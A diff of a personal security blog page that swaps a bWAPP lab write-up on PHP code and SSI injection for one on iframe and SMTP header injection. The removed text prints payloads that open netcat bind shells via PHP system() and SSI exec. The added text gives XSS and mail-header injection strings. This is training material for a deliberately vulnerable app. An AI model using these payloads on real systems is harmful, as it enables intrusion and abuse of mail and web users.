@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="BWAPP PHP and SSI Injection, CTF, OSCP, Cyber Security, Blockchain">
+    <meta name="keywords" content="BWAPP IFrame and SMTP Injection, CTF, OSCP, Cyber Security, Blockchain">
     <meta name="description" content="Mukhilan Pari Personal Blog">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -27,7 +27,7 @@
 </script>
 
 
-    <title>BWAPP PHP and SSI Injection | Mukhilan</title>
+    <title>BWAPP IFrame and SMTP Injection | Mukhilan</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -235,12 +235,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">BWAPP PHP and SSI Injection</h1>
+                    <h1 class="description center-align post-title">BWAPP IFrame and SMTP Injection</h1>
                 </div>
             </div>
         </div>
@@ -396,14 +396,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    344
+                    306
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    2 Min
+                    1 Min
                 </div>
                 
 
@@ -418,31 +418,20 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="BWAPP-A1-Injection"><a href="#BWAPP-A1-Injection" class="headerlink" title="BWAPP A1 - Injection"></a>BWAPP A1 - Injection</h1><h2 id="PHP-Code-Injection"><a href="#PHP-Code-Injection" class="headerlink" title="PHP Code Injection:"></a>PHP Code Injection:</h2><h3 id="LOW-LEVEL"><a href="#LOW-LEVEL" class="headerlink" title="LOW LEVEL :"></a>LOW LEVEL :</h3><p>To check whether its PHP code injectable. phpinfo() function can be used,</p>
-<pre><code>?message=phpinfo()</code></pre>
-<p>System commands also can be executed using PHP.</p>
-<p>For windows,</p>
-<pre><code>?message=1;system('dir')</code></pre>
-<p>For linux,</p>
-<pre><code>?message=1;system('ls')
-?message=1;system('nc -lvp 4444 -e /bin/bash')</code></pre>
-<p>To get a shell, execute <code>nc -vn *ip* 4444</code>.</p>
-<p>The source code is</p>
-<pre><code>&lt;p&gt;&lt;i&gt;&lt;?php @eval ("echo " . $_REQUEST["message"] . ";");?&gt;&lt;/i&gt;&lt;/p&gt;</code></pre>
-<h3 id="MEDIUM-LEVEL"><a href="#MEDIUM-LEVEL" class="headerlink" title="MEDIUM LEVEL :"></a>MEDIUM LEVEL :</h3><p>In this case, medium level and high level are same. The source code is </p>
-<pre><code>&lt;p&gt;&lt;i&gt;&lt;?php echo htmlspecialchars($_REQUEST["message"], ENT_QUOTES, "UTF-8");;?&gt;&lt;/i&gt;&lt;/p&gt;</code></pre>
-<h2 id="Server-Side-Includes-SSI-Injection"><a href="#Server-Side-Includes-SSI-Injection" class="headerlink" title="Server-Side Includes SSI Injection:"></a>Server-Side Includes SSI Injection:</h2><h3 id="LOW-LEVEL-1"><a href="#LOW-LEVEL-1" class="headerlink" title="LOW LEVEL :"></a>LOW LEVEL :</h3><p>1st check whether <code>&lt; ! # = / . " - &gt; and [a-zA-Z0-9]</code> these characters should take without any sanitization. After that, we can inject some payload.</p>
-<p>Payloads,</p>
-<pre><code>&lt;!--#exec cmd="ls" --&gt;
-&lt;!--#exec cmd="nc -lvp 8888 -e /bin/bash"--&gt;</code></pre>
-<p>To get a shell, execute <code>nc -nv *ip* 8888</code>. </p>
-<h3 id="MEDIUM-LEVEL-1"><a href="#MEDIUM-LEVEL-1" class="headerlink" title="MEDIUM LEVEL :"></a>MEDIUM LEVEL :</h3><p>In this level <code>"</code> this character is geting sanatized. we can check this using a sample input <code>&lt; ! # = / . " - &gt; and [a-zA-Z0-9]</code> and the output is <code>&lt; ! # = / . \" - &gt; And [a-zA-Z0-9]</code>.<br>In which <code>\"</code> doublequote is sanitized to prevent the payload with this character.</p>
-<p>payload,</p>
-<pre><code>&lt;!--#exec cmd=ls --&gt;</code></pre>
-<p>The source code is</p>
-<pre><code>$line = '&lt;p&gt;Hello ' . $firstname . ' ' . $lastname . ',&lt;/p&gt;&lt;p&gt;Your IP address is:' . '&lt;/p&gt;&lt;h1&gt;&lt;!--#echo var="REMOTE_ADDR" --&gt;&lt;/h1&gt;';</code></pre>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><pre><code>https://www.owasp.org/index.php/Testing_for_SSI_Injection_(OTG-INPVAL-009)
-https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection
+                <h1 id="BWAPP-A1-Injection"><a href="#BWAPP-A1-Injection" class="headerlink" title="BWAPP A1 - Injection"></a>BWAPP A1 - Injection</h1><h2 id="IFrame-Injection"><a href="#IFrame-Injection" class="headerlink" title="IFrame Injection:"></a>IFrame Injection:</h2><h3 id="LOW-LEVEL"><a href="#LOW-LEVEL" class="headerlink" title="LOW LEVEL :"></a>LOW LEVEL :</h3><p>By viewing the source code page, construct the payload accordingly.</p>
+<p>payloads to be used are,</p>
+<pre><code>localhost/bwapp/iframei.php?ParamUrl=https://www.mukhilan.com&amp;ParamWidth=250"&amp;ParamHeight=250
+localhost/bwapp/iframei.php?ParamUrl=javascript:alert(1)&amp;ParamWidth=250%22&amp;ParamHeight=250</code></pre>
+<p>The source code is,</p>
+<pre><code>&lt;iframe frameborder="0" src="&lt;?php echo xss($_GET["ParamUrl"])?&gt;" height="&lt;?php echo xss($_GET["ParamHeight"])?&gt;" width="&lt;?php echo xss($_GET["ParamWidth"])?&gt;"&gt;&lt;/iframe&gt;</code></pre>
+<h3 id="MEDIUM-LEVEL"><a href="#MEDIUM-LEVEL" class="headerlink" title="MEDIUM LEVEL :"></a>MEDIUM LEVEL :</h3><pre><code>localhost/bwapp/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250%22%3E%3C/iframe%3E%3Cscript%3Ealert(1);%3C/script%3E&amp;ParamHeight=250</code></pre>
+<p>payload is <code>"&gt;&lt;/iframe&gt;&lt;script&gt;alert(1);&lt;/script&gt;</code>.<br>Iframe’s last parameter is width. So, Payload should inject after paramWidth.</p>
+<p>The source code is,</p>
+<pre><code>&lt;iframe frameborder="0" src="robots.txt" height="&lt;?php echo xss($_GET["ParamHeight"])?&gt;" width="&lt;?php echo xss($_GET["ParamWidth"])?&gt;"&gt;&lt;/iframe&gt;</code></pre>
+<h2 id="Mail-Header-Injection-SMTP"><a href="#Mail-Header-Injection-SMTP" class="headerlink" title="Mail Header Injection (SMTP):"></a>Mail Header Injection (SMTP):</h2><p>In this, if the input field in the contact page is not filtered correctly. Then we can add extra content to the SMTP Header as below.</p>
+<p>In mail field, payload can be <code>exp1@exp1.com\r\nCc:exp@exp.com</code> or <code>exp1@exp1.com\r\nbcc:exp@exp.com</code>.</p>
+<p>Check the link in the reference section, Acunetix gave a good explanation of this vulnerability.</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><pre><code>https://www.acunetix.com/blog/articles/email-header-injection/
 https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</code></pre>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -487,7 +476,7 @@ https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://mukhilan.com/2019/01/21/bwapp-php-ssi/">http://mukhilan.com/2019/01/21/bwapp-php-ssi/</a>
+                    <a href="http://mukhilan.com/bwapp-iframe-smtp/">http://mukhilan.com/bwapp-iframe-smtp/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -599,7 +588,67 @@ https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</code></pre>
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2019/01/21/bwapp-os-injection/">
+                <a href="/multi-factor/">
+                    <div class="card-image">
+                        
+                        <img src="/medias/projects/multi/logo.png" class="responsive-img" alt="MULTI-FACTOR AUTHENTICATION SCHEME FOR ONLINE EXAMINATION">
+                        
+                        <span class="card-title">MULTI-FACTOR AUTHENTICATION SCHEME FOR ONLINE EXAMINATION</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Scheme for implementation of Multifactor Authentication
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2019-01-27
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Paper/" class="post-category">
+                                    Paper
+                                </a>
+                            
+                            <a href="/categories/Paper/Project/" class="post-category">
+                                    Project
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/python/">
+                        <span class="chip bg-color">python</span>
+                    </a>
+                    
+                    <a href="/tags/Paper/">
+                        <span class="chip bg-color">Paper</span>
+                    </a>
+                    
+                    <a href="/tags/Project/">
+                        <span class="chip bg-color">Project</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/bwapp-os-injection/">
                     <div class="card-image">
                         
                         
@@ -615,57 +664,8 @@ https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</code></pre>
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2019-01-21
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/Writeups/" class="post-category">
-                                    Writeups
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Bwapp/">
-                        <span class="chip bg-color">Bwapp</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2019/01/19/bwapp-html-2/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="BWAPP HTML Injection (Reflected URL/Stored Blog)">
-                        
-                        <span class="card-title">BWAPP HTML Injection (Reflected URL/Stored Blog)</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            BWAPP HTML Injection Reflected URL/Stored Blog solution
-                        
-                    </div>
-                    <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-01-19
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-01-21
                             </span>
                         <span class="publish-author">
                             
